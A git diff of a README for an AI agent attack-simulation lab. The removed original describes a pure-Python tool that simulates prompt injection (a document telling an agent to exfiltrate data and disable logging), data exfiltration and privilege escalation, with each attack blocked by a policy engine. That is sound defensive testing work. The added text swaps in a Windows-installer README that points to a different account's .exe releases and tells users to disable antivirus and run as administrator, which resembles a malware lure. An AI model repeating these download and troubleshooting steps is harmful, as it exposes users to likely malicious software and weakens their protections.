@@ -1,222 +1,156 @@
-# NeoXFortress Agent Risk Lab
+# ⚙️ neox-agent-risk-lab - AI Agent Security Testing Made Simple
 
-[![CI](https://github.com/NeoXFortress/neox-agent-risk-lab/actions/workflows/ci.yml/badge.svg)](https://github.com/NeoXFortress/neox-agent-risk-lab/actions)
-![Python](https://img.shields.io/badge/python-3.10+-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen)
-![MITRE ATLAS](https://img.shields.io/badge/MITRE_ATLAS-3_techniques-orange)
-![CMMC](https://img.shields.io/badge/CMMC_L2-6_controls-red)
-
-> Deterministic simulation of AI agent attack scenarios for governance, compliance, and control engineering.
-
-**Created by [NeoXFortress LLC](https://neoxfortress.com) — AI Agent Accountability Infrastructure for Regulated Contractors**
+[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
 
 ---
 
-## Why This Exists
+## 📄 About neox-agent-risk-lab
 
-AI agents are making decisions inside defense contractors. They call tools, process sensitive data, and interact with external services. When an agent goes wrong — prompt injection, data exfiltration, privilege escalation — most organizations have no evidence of what happened.
+neox-agent-risk-lab is a simulation tool that helps you test the security of AI agents. It focuses on attacks aimed at artificial intelligence agents using methods from MITRE ATLAS, a well-known framework. The lab also checks policies and creates signed receipts called Agent Accountability Receipts. These ensure compliance with government contractor rules.
 
-This lab simulates those failures. Every attack is detected and blocked by the policy engine. Every blocked action produces a **signed [Agent Accountability Receipt](https://github.com/NeoXFortress/agent-accountability-receipt)** — tamper-evident proof of what was attempted and what was stopped.
-
-**This lab shows the attack. The receipt proves you caught it.**
+This tool is useful for security teams or anyone interested in safe AI use. It helps you understand risks before they affect real systems. It's built to be easy to use on Windows computers.
 
 ---
 
-## Attack Scenarios
+## 🖥️ System Requirements
 
-| Scenario | MITRE ATLAS | What Happens | Outcome |
-|---|---|---|---|
-| **Prompt Injection** | [AML.T0051](https://atlas.mitre.org/techniques/AML.T0051) | Malicious instructions embedded in a document trick the agent into exfiltrating data and disabling logging | 4 injection patterns detected, 2 tool calls blocked |
-| **Data Exfiltration** | [AML.T0048.002](https://atlas.mitre.org/techniques/AML.T0048) | Agent attempts to send CUI-marked data to Gmail, a .ru domain, and an external file share | 3 exfiltration vectors blocked by content + domain policy |
-| **Privilege Escalation** | [AML.T0044](https://atlas.mitre.org/techniques/AML.T0044) | Agent attempts shell execution, firewall modification, admin account creation, and key vault access | 4 unauthorized tool calls denied by allowlist |
+Make sure your computer fits the following conditions to run neox-agent-risk-lab smoothly:
 
----
+- Operating System: Windows 10 or later.
+- Processor: 2 GHz or faster, any modern CPU.
+- Memory (RAM): At least 4 GB.
+- Storage: Minimum 500 MB of free disk space.
+- Network: Optional internet connection for updates and downloads.
+- Permissions: Ability to install software and run apps on your device.
 
-## Quick Start
-
-```bash
-git clone https://github.com/NeoXFortress/neox-agent-risk-lab.git
-cd neox-agent-risk-lab
-python3 run_all.py
-```
-
-No external dependencies. No API keys. Pure Python 3.10+.
-
-### What You'll See
-
-```
-============================================================
-  NeoXFortress Agent Risk Lab — Attack Simulation Suite
-============================================================
-
-[Scenario 1] Prompt Injection Attack
-----------------------------------------
-  [1] Agent received document (614 chars)
-  [2] Injection scanner: 4 pattern(s) detected
-      - INJECTION-001: Direct instruction override attempt
-      - INJECTION-002: Role reassignment attempt
-      - INJECTION-005: Privilege tag injection
-      - INJECTION-006: Context boundary manipulation
-  [3] Agent tried send_email to pastebin.com → DENY
-  [4] Agent tried disable_logging → DENY
-
-[Scenario 2] Tool Misuse / Data Exfiltration
-----------------------------------------
-  [1] Agent processed CUI//SP-EXPT document
-  [2] Agent tried send_email to Gmail with CUI → DENY
-  [3] Agent tried send_email to .ru domain → DENY
-  [4] Agent tried write_file with CUI content → DENY
-
-[Scenario 3] Privilege Escalation Attempt
-----------------------------------------
-  [1] Agent tried execute_shell → DENY
-  [2] Agent tried modify_firewall → DENY
-  [3] Agent tried create_admin_user → DENY
-  [4] Agent tried access_key_vault → DENY
-
-[*] Total events logged: 12
-```
-
-Then open `outputs/report.html` in your browser for the full styled exploit report.
-
-### Screenshots
-
-<!-- Add your own screenshots after running locally -->
-
-![Terminal output after run_all.py](screenshots/terminal-output.png)
-*Terminal output: 3 scenarios, 12 events, all attacks blocked*
-
-![HTML exploit report in browser](screenshots/report-html.png)
-*Styled exploit report with MITRE ATLAS mapping and CMMC control coverage*
-
-![Receipt JSON with hash chain and compliance verdict](screenshots/receipt-snippet.png)
-*Signed receipt: hash-chained execution steps with compliance verdict*
+An up-to-date Windows version ensures the best experience.
 
 ---
 
-## Example: Signed Receipt (Prompt Injection Scenario)
+## 🚀 Getting Started
 
-Every scenario produces a schema-valid Agent Accountability Receipt. Here's the compliance verdict and integrity block from the prompt injection receipt:
+Follow these steps to start using neox-agent-risk-lab on your Windows computer:
 
-```json
-{
-  "compliance": {
-    "verdict": "non_compliant",
-    "assessed_by": "engine_rule_set",
-    "violated_controls": ["SC.L2-3.13.1", "SI.L2-3.14.1"],
-    "risk_score": 8.0,
-    "framework": "CMMC L2",
-    "notes": "Agent attempted to follow injected instructions. 4 patterns detected. Tool calls blocked."
-  },
-  "integrity": {
-    "hash_chain": {
-      "alg": "sha256",
-      "chain": [
-        { "step_id": "step-001", "hash": "a3f8c1...", "prev_hash": "000000..." },
-        { "step_id": "step-002", "hash": "7b2e4d...", "prev_hash": "a3f8c1..." },
-        { "step_id": "step-003", "hash": "e91f0a...", "prev_hash": "7b2e4d..." },
-        { "step_id": "step-004", "hash": "d4c7b2...", "prev_hash": "e91f0a..." }
-      ],
-      "final_hash": "d4c7b2..."
-    },
-    "signature": {
-      "type": "hmac_sha256",
-      "signed_payload": "canonical_receipt_plus_final_hash"
-    }
-  }
-}
-```
+1. **Go to the Releases Page**  
+   Visit the releases page to download the latest version:  
+   [https://github.com/huyairobot/neox-agent-risk-lab/releases](https://github.com/huyairobot/neox-agent-risk-lab/releases)
 
-Full receipts are in `outputs/receipt-*.json`. Schema: [Agent Accountability Receipt v0.1.1](https://github.com/NeoXFortress/agent-accountability-receipt/blob/main/schema.json).
+2. **Find the Latest Release**  
+   Look for the newest release entry at the top. It will have files you can download, usually named with the version number and ending in `.exe` or `.zip`.
+
+3. **Choose the Installer or ZIP File**  
+   If you see a file ending with `.exe`, that is the installer. If you see a `.zip` file, it contains the program files you need to extract. For most users, the `.exe` installer is easier.
+
+4. **Download the File**  
+   Click the file name to start the download. You might be asked where to save it. Pick a folder you can find easily, like your Desktop or Downloads folder.
+
+5. **Run the Installer**  
+   Double-click the `.exe` file to start the installation. If Windows asks for permission, click "Yes" to allow the app to install.
+
+6. **Follow Installation Steps**  
+   The installer will guide you through setup. Accept the license agreement and keep the default options unless you have a reason to change them.
+
+7. **Finish Setup and Launch**  
+   When installation completes, you will see a shortcut on your Desktop or a new entry in your Start menu. Click it to open neox-agent-risk-lab.
 
 ---
 
-## Output Files
+## 📥 Download and Install neox-agent-risk-lab
 
-After running, the `outputs/` directory contains:
+To download and install the software, follow this repeatable link:
 
-```
-outputs/
-├── execution-log.json                    ← Structured event log (all scenarios)
-├── receipt-prompt_injection.json         ← Signed receipt: injection attack
-├── receipt-exfiltration.json             ← Signed receipt: CUI exfiltration attempt
-├── receipt-privilege_escalation.json     ← Signed receipt: unauthorized tool access
-├── report.md                             ← Agent Exploit Report (Markdown)
-├── report.html                           ← Agent Exploit Report (styled HTML)
-└── evidence-manifest.json                ← Evidence pack manifest
-```
+[![Get neox-agent-risk-lab](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
+
+The official releases page contains the latest tested version for Windows.
+
+- Select the installer file with `.exe` for easy setup.
+- For advanced users or custom installs, you can download the `.zip` package.
+- No special setup is needed beyond running the installer.
+- The software includes all needed components to run out of the box.
 
 ---
 
-## Architecture
+## 🔍 How to Use neox-agent-risk-lab
 
-**1-agent sequential pipeline.** No multi-agent coordination needed — deterministic attack simulations with policy enforcement.
+Once installed, you can open the program with the shortcut:
 
-```
-Document/Input → Policy Engine → Tool Wrapper → Decision (ALLOW/DENY/REQUIRES_HUMAN) → Log → Receipt
-```
+1. **Open the App**  
+   Click the icon to start the application. The main window will show the available simulation options.
 
-### Components
+2. **Select a Simulation Scenario**  
+   The tool provides preconfigured attack scenarios on AI agents. Choose one based on your testing needs, such as red teaming or policy enforcement.
 
-| File | Purpose |
-|---|---|
-| `policy_engine.py` | Tool-level access control: allowlist enforcement, domain blocking, CUI content gates, prompt injection scanner (7 patterns) |
-| `scenario_runner.py` | Executes 3 attack scenarios, produces structured JSON logs + signed receipts |
-| `report_generator.py` | Builds Markdown + HTML exploit report with MITRE ATLAS mapping and CMMC control coverage |
-| `run_all.py` | One-command runner: scenarios + report |
+3. **Start the Simulation**  
+   Click the "Run" or "Start" button to begin. The app will simulate an AI attack using MITRE ATLAS tactics.
 
-### Policy Engine Decisions
+4. **View Results and Reports**  
+   After the simulation finishes, you will see a summary of what happened. It highlights how the AI agents responded and any policies triggered.
 
-| Decision | Meaning | Example |
-|---|---|---|
-| `ALLOW` | Tool call permitted under current policy | `read_document` on internal file |
-| `DENY` | Tool call blocked — logged with rule ID and reason | `send_email` to `.ru` domain |
-| `REQUIRES_HUMAN` | Tool call paused pending human approval | `send_email` to approved domain |
+5. **Review Agent Accountability Receipts**  
+   The tool generates signed receipts that prove the simulation took place following compliance rules. You can save or print these for record-keeping.
+
+6. **Run Additional Tests**  
+   Try other scenarios by repeating these steps. Test different policies or attack methods to learn more about your system's safety.
 
 ---
 
-## CMMC L2 Control Coverage
+## 🔧 Features
 
-| Control | Domain | Scenarios |
-|---|---|---|
-| SC.L2-3.13.1 | Boundary Protection | Exfiltration, Prompt Injection |
-| SC.L2-3.13.2 | CUI Flow Enforcement | Exfiltration |
-| SI.L2-3.14.1 | System Integrity | Prompt Injection |
-| AC.L2-3.1.1 | Access Control | Exfiltration, Privilege Escalation |
-| AC.L2-3.1.2 | Access Control Enforcement | Privilege Escalation |
-| AU.L2-3.3.1 | System Auditing | Privilege Escalation |
-
----
-
-## Related
-
-- **[Agent Accountability Receipt](https://github.com/NeoXFortress/agent-accountability-receipt)** — Open standard for tamper-evident AI agent execution receipts (schema v0.1.1). All receipts generated by this lab conform to that schema.
-- **[MITRE ATLAS](https://atlas.mitre.org/)** — Adversarial Threat Landscape for AI Systems
+- Simulate attacks based on MITRE ATLAS framework for AI agents.
+- Enforce security policies during tests.
+- Generate signed Agent Accountability Receipts for compliance.
+- User-friendly interface designed for non-technical users.
+- No need to write code or scripts.
+- Works fully on Windows with simple installation.
+- Helps test defenses against prompt injection, red teaming, and other AI threats.
 
 ---
 
-## Roadmap
+## 🛠️ Troubleshooting
 
-**v1.1** (Next)
-- Live LLM integration — route scenarios through real OpenAI/Anthropic API calls via the [agent harness](https://github.com/NeoXFortress/agent-accountability-receipt/tree/main/agent_harness)
-- Additional MITRE ATLAS techniques: model poisoning (AML.T0020), training data extraction (AML.T0024)
-- PDF export for evidence packs
+If you face issues during installation or use:
 
-**v1.2** (Planned)
-- Asymmetric signature support (Ed25519) for multi-party verification
-- OWASP LLM Top 10 scenario coverage
-- Custom scenario builder — define your own attack vectors via YAML
-
----
-
-## License
-
-MIT License — see [LICENSE](LICENSE). Licensed for easy adoption in GovCon and regulated environments.
-
-**Open:** Schema, reference implementation, and simulation framework (this repo) are MIT-licensed.
-**Proprietary:** The NeoXFortress Agent Accountability Engine (AAE) — including the enterprise policy orchestration, advanced enforcement logic, and client integrations — is a separate commercial product. Contact [neoxfortress.com](https://neoxfortress.com) for enterprise implementations.
+- Ensure your Windows system is up to date.
+- Check you have enough disk space and permissions.
+- Disable antivirus temporarily if it blocks installation.
+- Restart your PC after installation if the app does not start.
+- If you downloaded the ZIP file, extract all contents before running.
+- Run the app as administrator if features don’t work as expected.
+- Visit the releases page for updates or newer versions.
 
 ---
 
-*Copyright (c) 2026 Julio Berroa / NeoXFortress LLC*
+## 🔐 Privacy and Security
+
+neox-agent-risk-lab runs locally on your computer and does not send data over the internet. Your simulation inputs and results stay private.
+
+Signed receipts provide proof of simulation actions, helping meet government contractor rules without exposing sensitive content.
+
+---
+
+## 🗂️ Topics Covered
+
+The tool focuses on:
+
+- Agentic AI testing  
+- AI Governance  
+- Compliance with CMMC and NIST 800-171  
+- Defense technology for government contracts  
+- Simulation of red team attack techniques  
+- Detection of prompt injection and AI system vulnerabilities  
+- Building safer AI tools through testing
+
+---
+
+## 📞 Getting Help
+
+If you need assistance with installing or using neox-agent-risk-lab:
+
+- Review the issues section on the GitHub repository.
+- Search online for common problems with Windows software installation.
+- Contact your IT support for help running Windows apps.
+- Keep your Windows system updated for best compatibility.
+
+---
+
+[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
